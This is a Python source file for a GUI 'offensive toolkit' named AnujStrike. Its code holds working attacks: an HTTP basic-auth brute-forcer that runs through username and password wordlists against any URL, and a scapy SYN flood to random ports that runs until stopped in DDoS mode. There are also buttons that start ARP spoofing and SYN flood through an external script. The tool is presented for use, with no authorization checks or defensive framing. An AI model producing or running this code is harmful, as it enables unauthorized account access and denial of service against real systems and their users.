""
# AnujStrike Offensive Toolkit GUI - Modernized Attractive UI

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import subprocess
import time
import psutil
import re
import requests
from scapy.all import IP, TCP, send
import socket
import random

running_threads = {}

def execute_attack(attack, target, interface, log_widget):
    if attack in ["sql_injection", "brute_force"] and not re.match(r"^https?://", target):
        target = "http://" + target

    stop_flag = threading.Event()
    running_threads[attack] = stop_flag

    if attack == "brute_force":
        thread = threading.Thread(target=real_brute_force, args=(target, log_widget, stop_flag), daemon=True)
    elif attack in ["dos", "ddos"]:
        thread = threading.Thread(target=run_dos_ddos, args=(attack, target, log_widget, stop_flag), daemon=True)
    else:
        cmd = ["python", "main.py", "--attack", attack, "--target", target, "--interface", interface]
        thread = threading.Thread(target=execute_cmd, args=(cmd, attack, target, interface, log_widget, stop_flag), daemon=True)
    thread.start()

def stop_attack(attack, log_widget):
    if attack in running_threads:
        running_threads[attack].set()
        log_widget.insert(tk.END, f"[{timestamp()}] [!] {attack} attack stopped by user.\n")

def execute_cmd(cmd, attack, target, interface, log_widget, stop_flag):
    log_widget.insert(tk.END, f"[{timestamp()}] [*] Starting {attack} against {target} on {interface}\n")
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in process.stdout:
        if stop_flag.is_set():
            process.terminate()
            break
        safe_line = line.replace("⚡", "*")
        log_widget.insert(tk.END, f"[{timestamp()}] {safe_line}")
        log_widget.see(tk.END)

def real_brute_force(target_url, log_widget, stop_flag):
    log_widget.insert(tk.END, f"[{timestamp()}] [*] Starting real brute-force attack on {target_url}\n")
    try:
        with open("usernames.txt") as ufile, open("passwords.txt") as pfile:
            usernames = [u.strip() for u in ufile if u.strip()]
            passwords = [p.strip() for p in pfile if p.strip()]
        for username in usernames:
            for password in passwords:
                if stop_flag.is_set():
                    return
                log_widget.insert(tk.END, f"[{timestamp()}] [*] Trying {username}:{password}\n")
                log_widget.see(tk.END)
                try:
                    resp = requests.get(target_url, auth=(username, password), timeout=5)
                    if resp.status_code == 200:
                        msg = f"[+] Success! Credentials found: {username}:{password}"
                        log_widget.insert(tk.END, f"[{timestamp()}] {msg}\n")
                        messagebox.showinfo("Brute-Force Success", msg)
                        return
                except requests.RequestException:
                    continue
        log_widget.insert(tk.END, f"[{timestamp()}] [!] Brute-force completed, no valid credentials found.\n")
    except FileNotFoundError:
        log_widget.insert(tk.END, f"[{timestamp()}] [!] usernames.txt or passwords.txt not found.\n")

def run_dos_ddos(attack, target, log_widget, stop_flag):
    log_widget.insert(tk.END, f"[{timestamp()}] [*] Starting {attack.upper()} attack on {target}\n")
    try:
        ip = socket.gethostbyname(target.replace("http://", "").replace("https://", "").split("/")[0])
    except socket.gaierror:
        log_widget.insert(tk.END, f"[{timestamp()}] [!] Invalid target: {target}\n")
        return

    count = 0
    while not stop_flag.is_set():
        random_port = random.randint(1, 65535)
        packet = IP(dst=ip)/TCP(dport=random_port, flags="S")
        send(packet, verbose=False)
        log_widget.insert(tk.END, f"[{timestamp()}] [*] Sent SYN packet to {ip}:{random_port}\n")
        log_widget.see(tk.END)
        count += 1
        if attack == "dos" and count >= 500:
            break
        time.sleep(0.01)

def timestamp():
    return time.strftime("%H:%M:%S")

def get_interfaces():
    return list(psutil.net_if_addrs().keys())

root = tk.Tk()
root.title("⚡ AnujStrike Offensive Toolkit ⚡")
root.geometry("1000x800")
root.configure(bg="#1b1b2f")

style = ttk.Style()
style.theme_use('clam')
style.configure("TLabel", background="#1b1b2f", foreground="#e0e0e0", font=("Segoe UI", 11))
style.configure("TButton", background="#262626", foreground="white", padding=8, relief="flat")
style.configure("TCombobox", fieldbackground="#2e2e3a", background="#2e2e3a", foreground="white")

header = tk.Label(root, text="AnujStrike Offensive Toolkit", bg="#1b1b2f", fg="#00d7c9", font=("Segoe UI", 20, "bold"))
header.pack(pady=20)

tabs = ttk.Notebook(root)
tabs.pack(padx=15, pady=10, expand=True, fill="both")

# Helper function to create stylized tab
def create_attack_tab(tab_title, fields, attack_key, has_interface=True):
    tab = tk.Frame(tabs, bg="#1b1b2f")
    tabs.add(tab, text=tab_title)

    entries = {}
    for label_text in fields:
        lbl = ttk.Label(tab, text=label_text)
        lbl.pack(pady=5)
        entry = ttk.Entry(tab)
        entry.pack(pady=5)
        entries[label_text] = entry

    iface_combo = None
    if has_interface:
        iface_label = ttk.Label(tab, text="Interface:")
        iface_label.pack(pady=5)
        iface_combo = ttk.Combobox(tab, values=get_interfaces())
        iface_combo.pack(pady=5)

    log_box = scrolledtext.ScrolledText(tab, height=18, bg="#0f0f1a", fg="#00ff9d")
    log_box.pack(pady=10, fill="both", expand=True)

    start_btn = ttk.Button(tab, text=f"Start {tab_title}", command=lambda: execute_attack(attack_key, entries[list(fields)[0]].get(), iface_combo.get() if iface_combo else "", log_box))
    start_btn.pack(side="left", padx=10)

    stop_btn = ttk.Button(tab, text="Stop", command=lambda: stop_attack(attack_key, log_box))
    stop_btn.pack(side="left", padx=10)

# ARP Spoof Tab
create_attack_tab("ARP Spoof", ["Target IP:"], "arp_spoof")
# SYN Flood Tab
create_attack_tab("SYN Flood", ["Target IP:"], "syn_flood")
# Brute Force Tab (no interface)
create_attack_tab("Brute Force", ["Target URL:"], "brute_force", has_interface=False)
# DoS/DDoS Tab (no interface)
create_attack_tab("DoS / DDoS", ["Target Host (IP or Domain):"], "dos", has_interface=False)

ddos_tab = tabs.tabs()[-1]
dos_frame = tabs.nametowidget(ddos_tab)

buttons_frame = tk.Frame(dos_frame, bg="#1b1b2f")
buttons_frame.pack(pady=5)

start_dos = ttk.Button(buttons_frame, text="Start DoS", command=lambda: execute_attack("dos", dos_frame.winfo_children()[1].get(), "", dos_frame.winfo_children()[3]))
start_dos.pack(side="left", padx=10)

start_ddos = ttk.Button(buttons_frame, text="Start DDoS", command=lambda: execute_attack("ddos", dos_frame.winfo_children()[1].get(), "", dos_frame.winfo_children()[3]))
start_ddos.pack(side="left", padx=10)

stop_btn = ttk.Button(buttons_frame, text="Stop", command=lambda: stop_attack("ddos", dos_frame.winfo_children()[3]))
stop_btn.pack(side="left", padx=10)

root.mainloop()
